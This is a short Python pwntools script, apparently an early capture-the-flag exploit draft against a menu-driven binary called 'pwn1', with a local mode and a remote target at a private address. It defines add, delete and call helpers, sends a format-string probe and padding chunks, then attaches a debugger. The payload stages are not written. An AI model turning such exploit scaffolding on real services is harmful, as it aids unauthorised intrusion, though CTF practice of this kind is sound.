#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./pwn1')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./pwn1')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('172.16.9.41',9002)
			elf=ELF('pwn1')
			libc=ELF('./libc.so.6')
		
		def add(a):
			io.sendlineafter('> ','1')
			io.sendlineafter('contents: ',a)

		def delete(a):
			io.sendlineafter('> ','2')
			io.sendlineafter('which: ',str(a))

		def call(a,b):
			io.sendlineafter('> ','3')
			io.sendlineafter('which: ',str(a))
			io.sendlineafter('who: ',str(b))

		io.recv()
		io.sendline('aaaa')
		add('%a')
		add('a'*0x50)
		add('a'*0x50)
		call(0,0)





		gdb.attach(io)
		pause()
		io.interactive()


	#except Exception as e:
		#raise e
	#else:
		#pass